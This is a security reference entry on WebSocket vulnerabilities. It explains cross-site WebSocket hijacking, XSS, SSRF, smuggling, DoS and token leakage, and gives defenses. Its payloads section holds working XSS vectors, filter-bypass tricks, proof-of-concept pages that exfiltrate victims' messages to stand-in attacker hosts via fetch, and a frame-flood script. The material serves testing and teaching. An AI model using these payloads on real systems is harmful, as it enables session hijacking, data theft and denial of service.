# WebSocket Vulnerabilities

> Missing origin checks and unvalidated WS messages enable hijacking and injection. **Deep dive:** [`Troubleshooting_Guide/webshotket.md`](../../../../Troubleshooting_Guide/webshotket.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A05:2021
**Status:** complete

## What it is
WebSockets upgrade an HTTP connection into a long-lived, bidirectional channel. The security
problems are mostly the web's familiar ones — XSS, CSRF, SSRF, auth bypass — re-appearing because
the WebSocket handshake and message frames often skip the validation a normal request would get.

## How it works
The attacker controls the cross-origin handshake and every message frame they send. Apps go wrong
by not validating the `Origin` header on the upgrade (so a victim's cookies authenticate an
attacker-initiated socket — Cross-Site WebSocket Hijacking), by trusting message content and
echoing it into the DOM (XSS) or into back-end queries, by authenticating only once at connect
time, and by letting the server open WebSockets to attacker-chosen internal hosts (SSRF) or
desync the front-end proxy (WebSocket smuggling).

## Impact
CSWSH gives full read/write access to the victim's authenticated session (chat history, account
actions). Reflected/stored XSS over WS messages leads to session theft and account takeover.
SSRF reaches internal services; smuggling routes requests to internal-only paths; secrets in the
WS URL leak to logs and history. Severity is commonly high — CSWSH and message-driven XSS are
session-compromising.

## How to detect
- Replay the handshake with a forged `Origin: https://attacker.com`; if the connection succeeds
  (no `403`/close), origin is not validated — CSWSH is likely.
- Send HTML/script in a message and watch whether it executes when other clients render it.
- Inspect the WS URL and frames for tokens/JWTs (URL leakage) and for `X-Forwarded-For` trust.
- `onerror`/`onclose` on a cross-origin PoC distinguishes an origin-checked endpoint from an open
  one (see the diagnostic PoC in Payloads).
- Point the handshake at an internal host/IP to probe for server-initiated SSRF.

## Exploitation (summary)
Discover sockets in the page JS, hook `WebSocket` to log frames, then attack the handshake:
forge `Origin` to test CSWSH and host a page that opens the socket with the victim's cookies and
exfiltrates received messages. Inject XSS payloads through message content where the server
reflects them. Point the server at internal targets for SSRF, or desync the proxy for smuggling.
Full PoCs and payload banks live in the Payloads section and the deep-dive note.

## Payloads & techniques

> Distilled from field payload references — for authorized testing only.

### Discovery & traffic observation

```bash
# find WebSocket usage in source
curl -s https://target.com | grep -iE "websocket|new WS\(|wss://"
curl -s https://target.com/app.js | grep -iE "WebSocket|\.onmessage|\.send\("
```

Hook the constructor from the browser console to log all frames and capture the socket for manual sends:

```javascript
(function () {
  const _WS = window.WebSocket;
  window.WebSocket = function (url, protocols) {
    const ws = new _WS(url, protocols);
    const origSend = ws.send.bind(ws);
    ws.send = function (data) { console.log("[WS SEND]", data); return origSend(data); };
    ws.addEventListener("message", (e) => console.log("[WS RECV]", e.data));
    return ws;
  };
})();
```

### XSS via WebSocket messages

If the server echoes message content into the DOM, inject through the socket — JSON or plain text protocol:

```javascript
ws.send(JSON.stringify({ message: "<img src=1 onerror='alert(1)'>" }));
ws.send("<img src=1 onerror='alert(1)'>");
```

Payload bank:

```javascript
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=x onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<script>alert(1)</script>
<style>@keyframes x{}</style><p style="animation:x onanimationstart=alert(1)">
<base href="https://evil.com/"><script>alert(1)</script>
<link rel="preload" href="x"><script>alert(1)</script>
```

### Filter-bypass matrix

Pair these with an `X-Forwarded-For: 1.1.1.1` header when the server bans on client IP.

| Technique | Payload | Description |
|-----------|---------|-------------|
| Case obfuscation | `<iMg sRc=1 oNeRrOr=alert(1)>` | bypass case-sensitive filters |
| HTML entity | `<img src=1 onerror&#x3D;alert(1)>` | encode `=` in attr name |
| Null byte | `<img src=1 onerror\x00=alert(1)>` | parser stops at null |
| Tab/space | `<img src=1 onerror\t=alert(1)>` | whitespace separator |
| Newline | `<img src=1 onerror\n=alert(1)>` | break attribute name |
| Slash separator | `<img src=1 onerror/alert(1)>` | `/` instead of `=` |
| Unicode slash | `<img src=x/onerror=alert(1)>` | fullwidth U+FF0F |
| SVG variant | `<svg/onload=alert(1)>` | alternate sink |
| Mutation XSS | various polyglots | DOM parser confusion |

### Cross-Site WebSocket Hijacking (CSWSH)

When `Origin` is not validated, a victim's authenticated cookies ride the cross-origin handshake. Host on an exploit server, trigger history, and exfiltrate:

```html
<script>
  var ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");
  ws.onopen = () => ws.send("READY");           // triggers chat history
  ws.onmessage = (event) => {
    fetch("https://YOUR-COLLABORATOR-URL", { method: "POST", mode: "no-cors", body: event.data });
  };
</script>
```

Self-hosted exfil variant (no Collaborator) pushes each message to a logging endpoint:

```html
<script>
  var ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");
  ws.onopen = () => ws.send("READY");
  ws.onmessage = (event) => {
    fetch("https://YOUR-EXPLOIT-SERVER/log?d=" + encodeURIComponent(event.data), { mode: "no-cors" });
  };
</script>
```

Diagnostic PoC — `onerror`/`onclose` distinguishes an Origin-checked endpoint from an open one:

```html
<script>
  const log = (m) => document.body.innerHTML += "<pre>" + JSON.stringify(m) + "</pre>";
  const ws = new WebSocket("wss://TARGET/chat");
  ws.onopen   = () => { log("Connected!"); ws.send("READY"); };
  ws.onmessage = (e) => log("Received: " + e.data);
  ws.onerror   = (e) => log("Error — Origin likely checked: " + e);
  ws.onclose   = (e) => log("Closed: code=" + e.code);
</script>
```

### Handshake manipulation

```http
GET /chat HTTP/1.1
Host: target.com
X-Forwarded-For: 1.1.1.1          # spoof IP if X-Forwarded-For is trusted
Origin: https://attacker.com       # if connection succeeds, Origin not checked
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==   # should be random per connection
```

Automate header injection with mitmproxy (`mitmproxy -s mitm_ws_header.py`):

```python
from mitmproxy import http

def websocket_start(flow: http.HTTPFlow):
    flow.request.headers["X-Forwarded-For"] = "1.1.1.1"
    flow.request.headers["Origin"] = "https://attacker.com"
```

### Protocol-level sends

```javascript
ws.send("Hello world");                                              // plain text
ws.send(JSON.stringify({ type: "message", content: "<img src=x onerror=alert(1)>" }));
ws.send("msg1"); ws.send("msg2"); ws.send("msg3");                   // burst
ws.send(new Uint8Array([0x00, 0x01, 0x02]));                         // binary
ws.send("\x89\x01");                                                 // ping frame (opcode 0x9)
```

### SSRF via WebSocket

```javascript
var ws = new WebSocket("ws://192.168.1.1:8080/internal-ws");
ws.onmessage = (e) => fetch("https://attacker.com/?d=" + btoa(e.data));

var ws = new WebSocket("ws://localhost:80");        // smuggle HTTP over WS
ws.onopen = () => ws.send("GET /admin HTTP/1.1\r\n\r\n");
```

### WebSocket smuggling

Desync the front-end into routing a smuggled request to internal-only paths:

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: keep-alive, Upgrade
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### Denial of service

```python
import asyncio, websockets

async def flood():
    async with websockets.connect('wss://target.com/chat') as ws:
        while True:
            await ws.send("A" * 65535)   # max-size frames
            await asyncio.sleep(0.001)

asyncio.run(flood())
```

### Token leakage via URL

Secrets in the WS URL leak into proxy/CDN/server access logs, browser history, and the Referer header:

```http
wss://target.com/chat?token=SECRET_JWT_HERE
```

## Defenses
1. **Validate the `Origin` header** on the handshake against an allow-list (and use CSRF tokens
   in the upgrade request) to stop CSWSH; never rely on cookies alone for the socket's identity.
2. **Treat every message as untrusted input** — validate/encode on output to defeat XSS, and use
   parameterized queries for any message data reaching the back end.
3. **Re-authenticate and re-authorize per message/action**, not just at connect time; use
   short-lived tokens in the handshake payload, never in the URL.
4. **Restrict server-initiated WebSocket targets** (allow-list hosts/schemes, block internal
   ranges) to prevent SSRF, and normalize/validate upgrade requests to block smuggling.
5. Use `wss://` (TLS), enforce frame-size and message-rate limits to mitigate DoS, and keep
   secrets out of the WS URL.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=WebSocket+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=WebSocket+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=WebSocket+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=WebSocket+Vulnerabilities
- **OSV** — https://osv.dev/list?q=WebSocket+Vulnerabilities
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `WebSocket Vulnerabilities <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- _Canonical class: Cross-Site WebSocket Hijacking — missing `Origin` validation on the upgrade.
  Documented by PortSwigger's research and reproduced in numerous product/bug-bounty advisories
  (e.g. chat and collaboration platforms accepting cross-origin handshakes)._
- _Canonical incident: token-in-WS-URL leakage — JWTs/session tokens placed in the `wss://` query
  string leaking via proxy, CDN, and server access logs; a recurring real-world finding._
- _Canonical class: WebSocket request smuggling — front-end/back-end desync on the `Upgrade`
  handshake routing smuggled requests to internal-only paths (HTTP/1.1 keep-alive + chunked)._

## References
- PortSwigger Web Security Academy — WebSocket security & Cross-Site WebSocket Hijacking.
- OWASP — Testing WebSockets (WSTG) and HTML5 / WebSocket security guidance.
- RFC 6455 — The WebSocket Protocol (esp. the `Origin` and handshake sections).
